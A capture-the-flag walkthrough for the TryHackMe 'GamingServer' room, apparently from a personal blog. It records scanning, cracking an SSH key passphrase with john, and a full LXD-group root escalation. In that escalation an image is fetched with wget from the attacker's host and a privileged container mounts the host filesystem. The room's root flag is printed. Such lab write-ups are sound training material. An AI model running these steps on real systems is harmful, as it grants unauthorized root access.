---
title: Walkthrough - GamingServer
published: true
---

Exploit LXD user group and container. Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

[https://tryhackme.com/room/gamingserver](https://tryhackme.com/room/gamingserver)

* * *

## Notes

- nmap

```shell
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

- gobuster

```shell
/uploads              (Status: 301) [Size: 314] [--> http://10.10.58.155/uploads/]
/about.php            (Status: 200) [Size: 2213]                                  
/robots.txt           (Status: 200) [Size: 33]                                    
/secret               (Status: 301) [Size: 313] [--> http://10.10.58.155/secret/] 
```

- rsa private key located in secret we can feed this to john and use it to login to ssh.
- ``john gamingserver.rsa --wordlist=/usr/share/seclists/Passwords/rockyou.txt``
- checking index.html found a username at the bottom of the page. now we can login

* * * 

## What is the user flag?

- ``cat user.txt``

* * * 

## What is the root flag?

- ``id``
- we are a member of lxd - [we can use this for privesc](https://reboare.github.io/lxd/lxd-escape.html)

```shell
john@exploitable:/tmp$ wget http://10.2.127.225/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-07-29 10:54:42--  http://10.2.127.225/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.2.127.225:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_0139.ta 100%[===================================================================>]   3.11M   295KB/s    in 11s     

2022-07-29 10:54:54 (286 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

john@exploitable:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jul 29, 2022 at 10:55am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # whoami
root
~ # ls -las
total 12
     4 drwx------    2 root     root          4096 Jul 29 10:57 .
     4 drwxr-xr-x   19 root     root          4096 Jul 29 10:56 ..
     4 -rw-------    1 root     root            18 Jul 29 10:57 .ash_history
~ # cd /root
~ # ls
~ # pwd
/root
~ # cd ..
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # cd /mnt/root
/mnt/root # ls
bin             dev             initrd.img      lib64           mnt             root            snap            sys             var
boot            etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
cdrom           home            lib             media           proc            sbin            swap.img        usr             vmlinuz.old
/mnt/root # cd /root
~ # ls
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

* * * 

